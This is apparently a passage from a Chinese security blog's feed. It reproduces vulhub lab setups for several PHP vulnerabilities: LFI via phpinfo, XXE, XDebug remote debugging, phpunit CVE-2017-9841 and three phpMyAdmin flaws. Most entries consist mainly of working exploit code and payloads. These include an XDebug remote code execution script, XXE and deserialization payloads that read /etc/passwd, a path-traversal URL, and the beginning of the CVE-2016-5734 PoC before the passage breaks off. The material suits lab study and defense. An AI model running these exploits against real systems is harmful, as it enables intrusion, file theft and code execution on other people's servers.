keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    poolsz<span class="token operator">=</span><span class="token number">10</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        poolsz <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span>      reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token operator">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">with</span> l<span class="token punctuation">:</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"\r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">print</span>        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"Woot!  \m/"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">":("</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"\nTelling threads to shutdown..."</span>        e<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Shuttin' down..."</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200324110641.png-water_print" alt=""></p><p>可见，执行到第 133 个数据包的时候就写入成功。然后，利用 lfi.php，即可执行任意命令：</p><p><a href="http://IP:8080/lfi.php?file=/tmp/g&amp;1=system(%27id%27);" target="_blank" rel="noopener">http://IP:8080/lfi.php?file=/tmp/g&amp;1=system(%27id%27);</a></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200324110802.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP环境 XML外部实体注入漏洞（XXE）</title>
      <link href="/2019/03/04/php-huan-jing-xml-wai-bu-shi-ti-zhu-ru-lou-dong/"/>
      <url>/2019/03/04/php-huan-jing-xml-wai-bu-shi-ti-zhu-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP环境-XML外部实体注入漏洞（XXE）"><a href="#PHP环境-XML外部实体注入漏洞（XXE）" class="headerlink" title="PHP环境 XML外部实体注入漏洞（XXE）"></a>PHP环境 XML外部实体注入漏洞（XXE）</h1><p>环境介绍：</p><ul><li>PHP 7.0.30</li><li>libxml 2.8.0</li></ul><p><code>libxml2.9.0</code> 以后，默认不解析外部实体，导致 XXE 漏洞逐渐消亡。为了演示 PHP 环境下的 XXE 漏洞，本例会将 <code>libxml2.8.0</code> 版本编译进 PHP 中。PHP 版本并不影响 <code>XXE</code> 利用。</p><p><code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code> 均可触发 XXE 漏洞，具体输出点请阅读这三个文件的代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Simple XXE Payload：</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY ></span>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200324103945.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XDebug 远程调试漏洞（代码执行）</title>
      <link href="/2019/03/04/xdebug-yuan-cheng-diao-shi-lou-dong/"/>
      <url>/2019/03/04/xdebug-yuan-cheng-diao-shi-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="XDebug-远程调试漏洞（代码执行）"><a href="#XDebug-远程调试漏洞（代码执行）" class="headerlink" title="XDebug 远程调试漏洞（代码执行）"></a>XDebug 远程调试漏洞（代码执行）</h1><p>XDebug 是 PHP 的一个扩展，用于调试 PHP 代码。如果目标开启了远程调试模式，并设置 <code>remote_connect_back = 1</code>：</p><pre><code>xdebug.remote_connect_back = 1xdebug.remote_enable = 1</code></pre><p>这个配置下，我们访问 <code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code> ，目标服务器的 XDebug 将会连接访问者的 IP（或X-Forwarded-For头指定的地址）并通过 <code>dbgp</code> 协议与其通信，通过 <code>dbgp</code> 中提供的 <code>eval</code> 方法即可在目标服务器上执行任意 PHP 代码。</p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>编译及启动测试环境</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p>启动完成后，访问 <code>http://your-ip:8080/</code> 即可发现主页是一个简单的 <code>phpinfo</code>，在其中可以找到 <code>xdebug</code> 的配置，可见开启了远程调试。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>因为需要使用 <code>dbgp</code> 协议与目标服务器通信，所以无法用 <code>http</code> 协议复现漏洞。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">import</span> re<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">import</span> argparse<span class="token keyword">import</span> socket<span class="token keyword">import</span> base64<span class="token keyword">import</span> binascii<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutorpool <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">recv_xml</span><span class="token punctuation">(</span>sock<span class="token punctuation">)</span><span class="token punctuation">:</span>    blocks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> b<span class="token string">''</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> data <span class="token operator">+</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">while</span> data<span class="token punctuation">:</span>            eop <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> eop <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            blocks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span>eop<span class="token punctuation">]</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> data<span class="token punctuation">[</span>eop<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>blocks<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> blocks<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">trigger</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?XDEBUG_SESSION_START=phpstorm'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'XDebug remote debug code execution.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--code'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'the code you want to execute.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--target'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'target url.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-l'</span><span class="token punctuation">,</span> <span class="token string">'--listen'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> type<span class="token operator">=</span>int<span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'local port'</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    ip_port <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>listen<span class="token punctuation">)</span>    sk <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ip_port<span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>trigger<span class="token punctuation">,</span> args<span class="token punctuation">.</span>target<span class="token punctuation">)</span>    conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> sk<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token string">'eval -i 1 -- '</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>args<span class="token punctuation">.</span>code<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> recv_xml<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Recieve data: '</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    g <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>rb<span class="token string">'&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>'</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> g<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] No result...'</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> g<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Result: '</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] May be not string result...'</span><span class="token punctuation">)</span></code></pre><p><code>python3 exp.py -t http://127.0.0.1:8080/index.php -c 'shell_exec('id');'</code></p><p><code>说明</code>：因为该通信是一个反向连接的过程，exp.py 启动后其实是会监听本地的 9000 端口（可通过-l参数指定）并等待 XDebug 前来连接，所以执行该脚本的服务器必须有外网 IP（或者与目标服务器处于同一内网）。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpunit 远程代码执行漏洞（CVE-2017-9841）</title>
      <link href="/2019/03/04/phpunit-yuan-cheng-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2019/03/04/phpunit-yuan-cheng-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="phpunit-远程代码执行漏洞（CVE-2017-9841）"><a href="#phpunit-远程代码执行漏洞（CVE-2017-9841）" class="headerlink" title="phpunit 远程代码执行漏洞（CVE-2017-9841）"></a>phpunit 远程代码执行漏洞（CVE-2017-9841）</h1><p>composer 是 php 包管理工具，使用 composer 安装扩展包将会在当前目录创建一个 <code>vendor</code> 文件夹，并将所有文件放在其中。通常这个目录需要放在 web 目录外，使用户不能直接访问。</p><p>phpunit 是 php 中的单元测试工具，其 <code>4.8.19 ~ 4.8.27</code> 和 <code>5.0.10 ~ 5.6.2</code> 版本的 <code>vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code> 文件有如下代码：</p><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'?>'</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'));</span></code></pre><p>如果该文件被用户直接访问到，将造成远程代码执行漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接将PHP代码作为 POST Body 发送给 <code>http://your-ip:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code>：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200324094105.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> phpunit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin scripts/setup.php 反序列化漏洞</title>
      <link href="/2019/03/04/phpmyadmin-scripts-setup.php-fan-xu-lie-hua-lou-dong/"/>
      <url>/2019/03/04/phpmyadmin-scripts-setup.php-fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="phpmyadmin-scripts-setup-php-反序列化漏洞"><a href="#phpmyadmin-scripts-setup-php-反序列化漏洞" class="headerlink" title="phpmyadmin scripts/setup.php 反序列化漏洞"></a>phpmyadmin scripts/setup.php 反序列化漏洞</h1><p>phpmyadmin 2.x 版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>发送如下数据包，即可读取 <code>/etc/passwd</code>：</p><pre class=" language-http"><code class="language-http">POST /scripts/setup.php HTTP/1.1<span class="token header-name keyword">Host:</span> your-ip:8080<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 80action=test&amp;configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200324095018.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> phpmyadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</title>
      <link href="/2019/03/04/phpmyadmin-4.8.1-yuan-cheng-wen-jian-bao-han-lou-dong/"/>
      <url>/2019/03/04/phpmyadmin-4.8.1-yuan-cheng-wen-jian-bao-han-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</h1><p>phpMyAdmin 是一套开源的、基于 Web 的 MySQL 数据库管理工具。其 index.php 中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问 <code>http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code>，可见 <code>/etc/passwd</code> 被读取，说明文件包含漏洞存在：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200324101045.png-water_print" alt=""></p><p>利用方式也比较简单，可以执行一下 <code>SELECT '&lt;?=phpinfo()?&gt;';</code> ，然后查看自己的 <code>sessionid</code> （cookie 中 phpMyAdmin 的值），然后包含 session 文件即可：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200324101104.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> phpmyadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）</title>
      <link href="/2019/03/04/phpmyadmin-4.0.x-4.6.2-yuan-cheng-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2019/03/04/phpmyadmin-4.0.x-4.6.2-yuan-cheng-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="phpMyAdmin-4-0-x—4-6-2-远程代码执行漏洞（CVE-2016-5734）"><a href="#phpMyAdmin-4-0-x—4-6-2-远程代码执行漏洞（CVE-2016-5734）" class="headerlink" title="phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）"></a>phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）</h1><p>phpMyAdmin 是一套开源的、基于 Web 的 MySQL 数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进 preg_replace 函数第一个参数中。</p><p>在 PHP5.4.7 以前，preg_replace 的第一个参数可以利用 \0 进行截断，并将正则模式修改为 e。众所周知，e 模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p><p>以下版本受到影响：</p><ul><li>4.0.10.16之前4.0.x版本</li><li>4.4.15.7之前4.4.x版本</li><li>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这个功能需要登录，且能够写入数据。</p><p>因为目标环境使用 root，所以我们可以创建一个临时数据库和数据表，进行漏洞利用。这里，我们使用 <code>POC</code> 来复现漏洞。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""run: ./cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls -lua');""""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> argparse<span class="token keyword">import</span> sys__author__ <span class="token operator">=</span> <span class="token string">"@iamsecurity"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> type<span class="token operator">=</span>str<span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"URL with path to PMA"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"--cmd"</span><span class="token punctuation">,</span> type<span class="token operator">=</span>str<span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"PHP command(s) to eval()"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-u"</span><span class="token punctuation">,</span> <span class="token string">"--user"</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> type<span class="token operator">=</span>str<span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"Valid PMA user"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-p"</span><span class="token punctuation">,</span> <span class="token string">"--pwd"</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> type<span class="token operator">=</span>str<span class="token 